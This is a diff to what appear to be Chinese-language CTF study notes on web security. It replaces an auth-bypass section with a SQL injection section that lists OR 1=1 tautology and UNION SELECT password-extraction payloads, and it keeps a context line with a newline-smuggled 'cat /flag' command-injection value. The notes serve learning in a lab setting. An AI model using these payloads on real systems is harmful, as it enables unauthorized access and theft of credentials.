@@ -38,5 +38,15 @@ hacker@web-security~path-traversal-1:~$ curl --path-as-is -v challenge.localhost
 params = {"filedir": b"/\ncat /flag"}
 ```
 
-## Auth Bypass
-这种攻击主要借助 SQL 注入，让程序误认为我们输入了正确了密码，实际上其实是利用注入使查询条件恒真。
+## SQL Injection (SQLi)
+更广为人知的是 SQL 注入，可以通过内嵌 SQL 命令进行伪造查询结果、更新数据表等恶意操作。
+
+比较常见的套路：
+```sql
+... password = {666666 OR 1 = 1}
+... password = '{666666' OR 1 = 1 --}'
+... username LIKE "{%" UNION SELECT password FROM users --}"
+```
+
+### 布尔盲注
+有时，前端不会显式返回查询的具体结果，而是只有二元变化（如验证通过/失败），此时可以利用这一二元结果获取信息。
